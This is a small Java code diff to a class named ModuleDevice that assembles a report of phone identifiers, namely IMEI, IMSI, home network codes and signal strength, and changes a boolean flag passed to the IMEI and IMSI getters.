@@ -179,8 +179,8 @@ public final class ModuleDevice extends BaseInstantModule {
                     + CR);
         } else if (Device.isGPRS()) {
             sb.append(Messages.getString("1c.50") + CR); //$NON-NLS-1$
-            sb.append(Messages.getString("1c.51") + device.getImei(true) + CR); //$NON-NLS-1$
-            sb.append(Messages.getString("1c.52") + device.getImsi(true) + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.51") + device.getImei(false) + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.52") + device.getImsi(false) + CR); //$NON-NLS-1$
             sb.append(Messages.getString("1c.53") + GPRSInfo.getHomeMCC() + CR); //$NON-NLS-1$
             sb.append(Messages.getString("1c.54") + GPRSInfo.getHomeMNC() + CR); //$NON-NLS-1$
             sb.append(Messages.getString("1c.55") + GPRSInfo.getCellInfo().getRSSI() + CR); //$NON-NLS-1$
